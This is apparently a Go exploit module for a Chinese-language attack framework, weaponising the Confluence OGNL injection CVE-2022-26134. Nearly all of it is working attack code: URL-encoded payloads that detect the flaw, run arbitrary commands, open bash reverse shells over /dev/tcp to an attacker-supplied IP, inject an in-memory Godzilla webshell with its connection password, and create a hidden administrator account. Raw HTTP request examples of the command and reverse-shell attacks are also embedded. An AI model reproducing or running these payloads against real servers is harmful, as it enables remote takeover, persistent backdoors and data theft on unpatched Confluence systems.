package exp_Confluence

import (
	"fmt"
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/common"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"net/url"
	"strings"
)

type Exp_CVE_2022_26134 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_CVE_2022_26134) GetMsg1(cmd string) (expResult exp_model.ExpResult) {

	headers := self.GetInitExpHeaders() //获取自定义header
	payload := `/%24%7B(%40com.opensymphony.webwork.ServletActionContext%40getResponse().setHeader(%22123%22%2Ctrue))%7D/`
	header := goutils.RandomHexString(5) //生成随机响应头
	payload = strings.Replace(payload, "123", header, 1)

	//发送请求
	httpresp := self.HttpGetWithoutRedirect(self.AppendUri(self.Params.Target, payload), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err
		return
	}
	if httpresp.Resp.Header.Get(header) == "" {
		self.EchoErrMsg("漏洞不存在！")
	} else {
		self.EchoInfoMsg("漏洞存在！")
	}

	return
}
func (self *Exp_CVE_2022_26134) Cmd1(cmd string) (expResult exp_model.ExpResult) {

	headers := self.GetInitExpHeaders() //获取自定义header
	payload := `/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/`

	header := goutils.RandomHexString(5) //生成随机响应头
	payload = strings.Replace(payload, "X-Cmd-Response", header, 1)
	payload = strings.Replace(payload, "id", cmd, 1)

	//发送请求
	httpresp := self.HttpGetWithoutRedirect(self.AppendUri(self.Params.Target, payload), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err
		return
	}
	if httpresp.Resp.Header.Get(header) == "" {
		self.EchoErrMsg("执行失败！")
		return

	}
	expResult.Result = httpresp.Resp.Header.Get(header)

	return
}
func (self *Exp_CVE_2022_26134) Reverse1(ip, port string) (expResult exp_model.ExpResult) {
	if !goutils.IsValidIP(ip) {
		self.EchoErrMsg("请输入正确的IP！")
		return
	}
	headers := self.GetInitExpHeaders()      //获取自定义header
	randHeader := goutils.RandomHexString(5) //生成随机响应头

	payload := `/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/IPAndPort%200%3E%261%27%29.start%28%29%22%29.%28@com.opensymphony.webwork.ServletActionContext@getResponse%28%29.setHeader%28%22X-Status%22%2C%22ok%22%29%29%7D/`

	payload = strings.Replace(payload, "IPAndPort", fmt.Sprintf("%s/%s", ip, port), 1)
	payload = strings.Replace(payload, "X-Status", randHeader, 1)

	//发送请求
	httpresp := self.HttpGetWithoutRedirect(self.AppendUri(self.Params.Target, payload), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err
		return
	}
	if httpresp.Resp.Header.Get(randHeader) == "ok" {
		self.EchoInfoMsg("执行成功！")
	} else {
		self.EchoErrMsg("执行失败")
	}
	return
}
func stringToAscii(input string) string {
	out := make([]int, len(input))
	for i, v := range input {
		out[i] = int(v)
	}
	out = append(out)
	str := strings.Trim(strings.Replace(fmt.Sprint(out), " ", ",", -1), "[]")
	return str
}

func (self *Exp_CVE_2022_26134) GetMsg2(cmd string) (expResult exp_model.ExpResult) {

	headers := self.GetInitExpHeaders() //获取自定义header
	payload := `/$%7BClass.forName%28%22com.opensymphony.webwork.ServletActionContext%22%29.getMethod%28%22getResponse%22%2Cnull%29.invoke%28null%2Cnull%29.setHeader%28%22X-CMD%22%2C%22ok%22%29%7D/`
	randHeader := goutils.RandomHexString(5) //生成随机响应头
	payload = strings.Replace(payload, "X-CMD", randHeader, 1)

	//发送请求
	httpresp := self.HttpGetWithoutRedirect(self.AppendUri(self.Params.Target, payload), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err
		return
	}
	if httpresp.Resp.Header.Get(randHeader) == "" {
		self.EchoErrMsg("漏洞不存在！")
	} else {
		self.EchoInfoMsg("漏洞存在！")
	}

	return
}

func (self *Exp_CVE_2022_26134) Cmd2(cmd string) (expResult exp_model.ExpResult) {

	headers := self.GetInitExpHeaders() //获取自定义header
	payload := `/$%7BClass.forName(%22com.opensymphony.webwork.ServletActionContext%22).getMethod(%22getResponse%22,null).invoke(null,null).setHeader(%22X-CMD%22,Class.forName(%22javax.script.ScriptEngineManager%22).newInstance().getEngineByName(%22nashorn%22).eval(%22eval(String.fromCharCode(118,97,114,32,115,61,39,39,59,118,97,114,32,112,112,32,61,32,106,97,118,97,46,108,97,110,103,46,82,117,110,116,105,109,101,46,103,101,116,82,117,110,116,105,109,101,40,41,46,101,120,101,99,40,39,105,100,39,41,46,103,101,116,73,110,112,117,116,83,116,114,101,97,109,40,41,59,119,104,105,108,101,32,40,49,41,32,123,118,97,114,32,98,32,61,32,112,112,46,114,101,97,100,40,41,59,105,102,32,40,98,32,61,61,32,45,49,41,32,123,98,114,101,97,107,59,125,115,61,115,43,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,98,41,125,59,115))%22))%7D/`
	header := goutils.RandomHexString(5) //生成随机响应头
	payload = strings.Replace(payload, "X-CMD", header, 1)
	payload = strings.Replace(payload, "105,100", stringToAscii(cmd), 1)

	//发送请求
	httpresp := self.HttpGetWithoutRedirect(self.AppendUri(self.Params.Target, payload), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err
		return
	}
	if httpresp.Resp.Header.Get(header) == "" {
		self.EchoErrMsg("执行失败！")
		return

	}
	expResult.Result = httpresp.Resp.Header.Get(header)

	return
}

func (self *Exp_CVE_2022_26134) Reverse2(ip, port string) (expResult exp_model.ExpResult) {
	if !goutils.IsValidIP(ip) {
		self.EchoErrMsg("请输入正确的IP！")
		return
	}
	headers := self.GetInitExpHeaders()      //获取自定义header
	randHeader := goutils.RandomHexString(5) //生成随机响应头

	payload := `/$%7BClass.forName(%22com.opensymphony.webwork.ServletActionContext%22).getMethod(%22getResponse%22,null).invoke(null,null).setHeader(%22X-CMD%22,%20Class.forName(%22javax.script.ScriptEngineManager%22).newInstance().getEngineByName(%22nashorn%22).eval(%22new%20java.lang.ProcessBuilder().command('bash','-c','bash%20-i%20%3E&%20/dev/tcp/ip/port%200%3E&1').start()%22))%7D'%0A%0A/`
	payload = strings.Replace(payload, "ip/port", fmt.Sprintf("%s/%s", ip, port), 1)
	payload = strings.Replace(payload, "X-CMD", randHeader, 1)

	//发送请求
	httpresp := self.HttpGetWithoutRedirect(self.AppendUri(self.Params.Target, payload), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err
		return
	}
	if httpresp.Resp.Header.Get(randHeader) != "" {
		self.EchoInfoMsg("执行成功！")
	} else {
		self.EchoErrMsg("执行失败")
	}
	return
}

func (self *Exp_CVE_2022_26134) Upload2(filename string, content string) (expUploadResult exp_model.ExpUploadResult) {
	headers := self.GetInitExpHeaders() //获取自定义header
	payload := `/$%7BClass.forName%28%22com.opensymphony.webwork.ServletActionContext%22%29.getMethod%28%22getResponse%22%2Cnull%29.invoke%28null%2Cnull%29.setHeader%28%22X-CMD%22%2CClass.forName%28%22javax.script.ScriptEngineManager%22%29.newInstance%28%29.getEngineByName%28%22nashorn%22%29.eval%28@com.opensymphony.webwork.ServletActionContext@getRequest%28%29.getParameter%28%22search%22%29%29%29%7D/`
	body := `var classBytes = java.util.Base64.getDecoder().decode("");
var loader = java.lang.Thread.currentThread().getContextClassLoader();
var reflectUtilsClass = java.lang.Class.forName("org.springframework.cglib.core.ReflectUtils",true,loader);
var urls = java.lang.reflect.Array.newInstance(java.lang.Class.forName("java.net.URL"),0);

var params = java.lang.reflect.Array.newInstance(java.lang.Class.forName("java.lang.Class"),3);
params[0] = java.lang.Class.forName("java.lang.String");
params[1] = java.lang.Class.forName("[B");
params[2] = java.lang.Class.forName("java.lang.ClassLoader");


var defineClassMethod = reflectUtilsClass.getMethod("defineClass",params);

params =  java.lang.reflect.Array.newInstance(java.lang.Class.forName("java.lang.Object"),3);

params[0] = "Payload147998343341100";
params[1] = classBytes;
params[2] = loader;
defineClassMethod.invoke(null,params).newInstance();
"ok";`
	headers.Set("Accept-Encoded", "gzip, deflate")
	//发送请求
	httpresp := self.HttpPostWithoutRedirect(self.AppendUri(self.Params.Target, payload), "search="+url.QueryEscape(body), headers)
	if httpresp.Err != nil {
		expUploadResult.Err = httpresp.Err
		return
	}
	if httpresp.Resp.Header.Get("Transfer-encoded") == "chunked" {
		expUploadResult.Status = true
		self.EchoInfoMsg("注入listener内存马成功")
		self.EchoInfoMsg("连接时请使用响应为200的页面连接，如/login.action?logout=true")
		self.EchoInfoMsg("哥斯拉4.0.1 JAVA_AES_BASE64 密码2333 密钥2333")
		self.EchoInfoMsg("插入头部Accept-Encoded: gzip, deflate, god")
		self.EchoInfoMsg("注入成功后无法二次注入")
	}
	return
}

func (self *Exp_CVE_2022_26134) Cmd3(cmd string) (expResult exp_model.ExpResult) {
	headers := self.GetInitExpHeaders() //获取自定义header
	payload := `/$%7B@com.atlassian.confluence.util.GeneralUtil@getUserAccessor().addUser('example','example','example@example.org','Example',@com.atlassian.confluence.util.GeneralUtil@splitCommaDelimitedString(%22confluence-administrators,confluence-users%22)).%28@com.opensymphony.webwork.ServletActionContext@getResponse%28%29.setHeader%28%22X-Status%22%2C%22ok%22%29%29%7D/`

	randHeader := goutils.RandomHexString(5) //生成随机响应头

	userInfo := fmt.Sprintf("'%s','%s','%s','%s'",
		self.GetItemSafe(self.Params.Options.CmdSubOptions, "user"),
		self.GetItemSafe(self.Params.Options.CmdSubOptions, "pwd"),
		self.GetItemSafe(self.Params.Options.CmdSubOptions, "mail"),
		self.GetItemSafe(self.Params.Options.CmdSubOptions, "display"))
	payload = strings.Replace(payload, "'example','example','example@example.org','Example'", userInfo, 1)
	payload = strings.Replace(payload, "X-Status", randHeader, 1)

	self.EchoDebugMsg(userInfo)
	self.EchoDebugMsg(payload)
	//发送请求
	httpresp := self.HttpGetWithoutRedirect(self.AppendUri(self.Params.Target, payload), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err
		return
	}
	if httpresp.Resp.Header.Get(randHeader) != "" {
		self.EchoInfoMsg("执行成功，请尝试登录添加的账户！")
	} else {
		self.EchoErrMsg("执行失败")
	}
	return
}

func init() {
	expmsg := exp_model.ExpMsg{
		Author: "小晨曦 Modify By lz520520",
		Time:   `2022-06-06`,
		Range: `1.3.0 <= Confluence Server and Data Center < 7.4.17
7.13.0 <= Confluence Server and Data Center < 7.13.7
7.14.0 <= Confluence Server and Data Center < 7.14.3
7.15.0 <= Confluence Server and Data Center < 7.15.2
7.16.0 <= Confluence Server and Data Center < 7.16.4
7.17.0 <= Confluence Server and Data Center < 7.17.4
7.18.0 <= Confluence Server and Data Center < 7.18.1`,
		ID:       `CVE-2022-26134`,
		Describe: `Atlassian Confluence OGNL表达式注入漏洞`,
		Details: `
payload1: 检测漏洞、命令执行及反弹shell（<7.17.4）
payload2: 检测漏洞、命令执行、反弹shell、内存马注入（<7.18.1）
          内存马注入无需填写任何信息，直接点击上去即可，成功后返回连接信息
payload3: 添加用户，用户名（必须小写），密码，邮箱（可置空），全名（可置空） 无回显（<7.18.1）
`,
		Payload: `
命令执行：
GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1
Host: your-ip:8090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close

反弹shell：
GET /%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/127.0.0.1/1234%200%3E%261%27%29.start%28%29%22%29%7D/ HTTP/1.1
Host: your-ip:8090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
`,
		VulType:   common.VulCmdExec,
		Reference: `https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html`,
	}

	addUserSubOption := exp_model.ExpSubOption{
		CmdSubOptions: []exp_model.ExpSubOptionItem{
			{
				StaticText: "用户名: ",
				Key:        "user",
				Value:      "confluence-admins",
			},
			{
				StaticText: "密码: ",
				Key:        "pwd",
				Value:      "Test@1234",
			},
			{
				StaticText: "邮箱: ",
				Key:        "mail",
				Value:      "confluence-admins@confluence.com",
			},
			{
				StaticText: "显示: ",
				Key:        "display",
				Value:      "Confluence-admins",
			},
		},
	}
	registerMsg := exp_register.ExpRegisterMsg{
		Msg: expmsg,
		SubOptions: map[string]exp_model.ExpSubOption{
			//"1": addUserSubOption,
			"3": addUserSubOption,
		},
		AliasMap: map[string]string{
			"1": "7.17.4",
			"2": "7.18.1",
			"3": "AddUser",
		},
	}
	exp_register.ExpStructRegister(&Exp_CVE_2022_26134{}, registerMsg)

}
